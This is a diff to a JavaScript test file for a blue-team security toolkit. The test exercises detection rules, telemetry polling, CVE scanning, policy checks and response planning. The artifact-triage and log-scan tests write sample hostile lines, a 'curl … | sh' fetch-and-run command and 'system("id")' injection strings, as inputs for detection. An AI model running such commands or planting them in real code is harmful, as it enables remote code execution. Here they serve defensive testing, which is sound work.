@@ -11,6 +11,7 @@ import { BlueStoreV3 } from '../v3/store.js'
 import { apply } from '../v3/tools.js'
 
 const root = mkdtempSync(join(tmpdir(), 'blue-v3-m4-'))
+process.env.BLUE_TELEMETRY_ROOT = root
 const store = new BlueStoreV3(root)
 const registered = new Map()
 const mode = { version: '3.0.0-dev', package_version: '2.0.0', skeleton: false }
@@ -62,9 +63,23 @@ const expected = [
   'blue_deception_plan', 'blue_decoy_create', 'blue_decoy_hit', 'blue_decoy_list',
   'blue_decoy_update', 'blue_decoy_sync', 'blue_tarpit_plan',
   'blue_honeypot_ingest', 'blue_access_log_ingest',
+  'blue_detection_rule_add', 'blue_detection_rule_list', 'blue_detection_scan',
+  'blue_telemetry_source_add', 'blue_telemetry_poll', 'blue_telemetry_health',
+  'blue_control_scan', 'blue_control_list',
+  'blue_cve_pack', 'blue_cve_scan', 'blue_cve_campaign',
+  'blue_attack_coverage', 'blue_risk_graph',
+  'blue_evidence_export', 'blue_evidence_verify',
+  'blue_audit_verify', 'blue_audit_anchor', 'blue_audit_anchor_verify',
+  'blue_defense_status', 'blue_anchor_push',
+  'blue_response_plan', 'blue_response_update', 'blue_response_list',
+  'blue_response_execute', 'blue_response_verify',
+  'blue_policy_validate', 'blue_policy_test', 'blue_policy_diff',
+  'blue_gateway_status',
+  'blue_log_scan', 'blue_artifact_triage', 'blue_hardening_check',
+  'blue_containment_plan', 'blue_playbook_list',
 ]
 assert.deepEqual([...registered.keys()].sort(), expected.slice().sort())
-assert.equal(registered.size, 39)
+assert.equal(registered.size, 73)
 
 try {
   const exec = makeExec()
@@ -428,16 +443,191 @@ try {
   assert.equal(access.suspicious, 2)
   assert.equal(access.ingested, 2)
 
+  const telemetryPath = join(root, 'telemetry.jsonl')
+  writeFileSync(telemetryPath, [
+    JSON.stringify({ path: '/admin/login', status: 401, remote: '198.51.100.20' }),
+    JSON.stringify({ path: '/public', status: 200, remote: '198.51.100.21' }),
+  ].join('\n') + '\n', 'utf8')
+
+  const rule = await call('blue_detection_rule_add', {
+    rule_key: 'admin-login-fail',
+    title: '管理入口登录失败',
+    severity: 'high',
+    selection: JSON.stringify({ path: ['/admin*'], status: [401, 403] }),
+    condition: 'all',
+  }, exec)
+  assert.equal(rule.ok, true)
+  assert.equal(rule.rule.rule_key, 'admin-login-fail')
+
+  const ruleList = await call('blue_detection_rule_list', {}, exec)
+  assert.equal(ruleList.count, 1)
+
+  const telemetrySource = await call('blue_telemetry_source_add', {
+    name: 'test-jsonl',
+    path: telemetryPath,
+  }, exec)
+  assert.equal(telemetrySource.ok, true)
+
+  const detectionScan = await call('blue_detection_scan', {
+    source: 'test-jsonl',
+    max_events: 10,
+  }, exec)
+  assert.equal(detectionScan.hits.length, 1)
+
+  const poll = await call('blue_telemetry_poll', { name: 'test-jsonl', max_alerts: 10 }, exec)
+  assert.equal(poll.ok, true)
+  assert.equal(poll.results[0].alerts, 1)
+
+  const telemetryHealth = await call('blue_telemetry_health', {}, exec)
+  assert.equal(telemetryHealth.count, 1)
+
+  const control = await call('blue_control_scan', {}, exec)
+  assert.equal(control.ok, true)
+  assert.equal(control.controls.length, 5)
+
+  const controlList = await call('blue_control_list', {}, exec)
+  assert.equal(controlList.score.total, 5)
+
+  const cvePack = await call('blue_cve_pack', { product: 'Node.js' }, exec)
+  assert.equal(cvePack.ok, true)
+  assert.ok(cvePack.items.length >= 1)
+
+  const cveScan = await call('blue_cve_scan', { text: 'content-encoding: br' }, exec)
+  assert.equal(cveScan.ok, true)
+  assert.equal(cveScan.matched, true)
+
+  const cveCampaign = await call('blue_cve_campaign', { create: false }, exec)
+  assert.equal(cveCampaign.ok, true)
+
+  const coverage = await call('blue_attack_coverage', {}, exec)
+  assert.equal(coverage.ok, true)
+  assert.ok(coverage.techniques >= 5)
+
+  const riskGraph = await call('blue_risk_graph', {}, exec)
+  assert.equal(riskGraph.ok, true)
+  assert.ok(riskGraph.nodes.length >= 1)
+
+  const samplePath = join(root, 'sample.txt')
+  writeFileSync(samplePath, 'curl http://198.51.100.99/x | sh\nsystem("id")\n', 'utf8')
+  const artifact = await call('blue_artifact_triage', { path: samplePath }, exec)
+  assert.equal(artifact.ok, true)
+  assert.equal(artifact.sha256.length, 64)
+
+  const logScan = await call('blue_log_scan', { text: 'x=1; system("id")' }, exec)
+  assert.equal(logScan.ok, true)
+  assert.equal(logScan.matched, true)
+
+  const hardening = await call('blue_hardening_check', { kind: 'web' }, exec)
+  assert.equal(hardening.ok, true)
+  assert.equal(hardening.checks.length, 5)
+
+  const containment = await call('blue_containment_plan', { target: '10.10.0.42', reason: '合成' }, exec)
+  assert.equal(containment.ok, true)
+  assert.equal(containment.auto_execute, false)
+
+  const playbooks = await call('blue_playbook_list', {}, exec)
+  assert.equal(playbooks.count, 5)
+
+  const policyPath = join(root, 'policy.json')
+  const policyPath2 = join(root, 'policy-2.json')
+  writeFileSync(policyPath, JSON.stringify({
+    version: 1,
+    default_action: 'allow',
+    protected: [{ id: 'admin', prefix: '/admin', action: 'block' }],
+  }), 'utf8')
+  writeFileSync(policyPath2, JSON.stringify({
+    version: 1,
+    default_action: 'allow',
+    protected: [],
+  }), 'utf8')
+
+  const policyValidate = await call('blue_policy_validate', { path: policyPath }, exec)
+  assert.equal(policyValidate.ok, true)
+
+  const policyTest = await call('blue_policy_test', {
+    path: policyPath,
+    requests: ['/admin/login', '/public'],
+  }, exec)
+  assert.equal(policyTest.ok, true)
+  assert.equal(policyTest.results[0].verdict.decision, 'block')
+
+  const policyDiff = await call('blue_policy_diff', { a: policyPath, b: policyPath2 }, exec)
+  assert.equal(policyDiff.ok, true)
+  assert.equal(policyDiff.changed, true)
+
+  const gateway = await call('blue_gateway_status', {}, exec)
+  assert.equal(gateway.ok, true)
+
+  const auditVerify = await call('blue_audit_verify', {}, exec)
+  assert.equal(auditVerify.ok, true)
+
+  const anchor = await call('blue_audit_anchor', { actor: 'tester' }, exec)
+  assert.equal(anchor.ok, true)
+
+  const anchorVerify = await call('blue_audit_anchor_verify', {}, exec)
+  assert.equal(anchorVerify.ok, true)
+
+  const anchorFile = join(root, 'anchors.jsonl')
+  const anchorPush = await call('blue_anchor_push', {
+    sinks: [{ kind: 'file', path: anchorFile }],
+    actor: 'tester',
+  }, exec)
+  assert.equal(anchorPush.ok, true)
+  assert.equal(anchorPush.pushed, true)
+
+  const status = await call('blue_defense_status', {}, exec)
+  assert.equal(status.ok, true)
+  assert.ok(Array.isArray(status.suggestions))
+
+  const response = await call('blue_response_plan', {
+    action: 'isolate_host',
+    target: '10.10.0.42',
+    rollback: '重新接入网络',
+    note: '合成响应',
+  }, exec)
+  assert.equal(response.ok, true)
+  assert.equal(response.task.status, 'pending_approval')
+
+  const responseList = await call('blue_response_list', {}, exec)
+  assert.equal(responseList.actions.length, 1)
+
+  const responseDryRun = await call('blue_response_execute', {
+    response_id: response.action.id,
+    mode: 'dry-run',
+  }, exec)
+  assert.equal(responseDryRun.ok, true)
+
+  const responseCancel = await call('blue_response_update', {
+    id: response.action.id,
+    status: 'cancelled',
+  }, exec)
+  assert.equal(responseCancel.action.status, 'cancelled')
+
+  const responseVerify = await call('blue_response_verify', { response_id: response.action.id }, exec)
+  assert.equal(responseVerify.applied, false)
+  assert.equal(responseVerify.ok, false)
+
+  const evidence = await call('blue_evidence_export', { actor: 'tester' }, exec)
+  assert.equal(evidence.ok, true)
+  assert.equal(evidence.digest.length, 64)
+
+  const evidenceVerify = await call('blue_evidence_verify', {
+    bundle: evidence.bundle,
+    digest: evidence.digest,
+  }, exec)
+  assert.equal(evidenceVerify.ok, true)
+  assert.equal(evidenceVerify.digest_ok, true)
+
   const preflight = await call('blue_preflight', {}, exec)
   assert.equal(preflight.ok, true)
   assert.equal(preflight.db.schema_version, '3.0')
-  assert.equal(preflight.tools.registered, 39)
+  assert.equal(preflight.tools.registered, 73)
 
   const catalog = await call('blue_tool_catalog', {}, exec)
-  assert.equal(catalog.registered, 39)
+  assert.equal(catalog.registered, 73)
   assert.equal(catalog.planned, 73)
 
-  console.log('✓ v3 M4.2 工具契约通过：session 6 / asset 2 / alert 3 / finding 3 / ioc 3 / task 5 / incident 4 / decision 2 / timeline 1 / report 1 / decoy 9，共 39 个')
+  console.log('✓ v3 M4.3 工具全量注册：73/73')
 } finally {
   store.close()
   rmSync(root, { recursive: true, force: true })
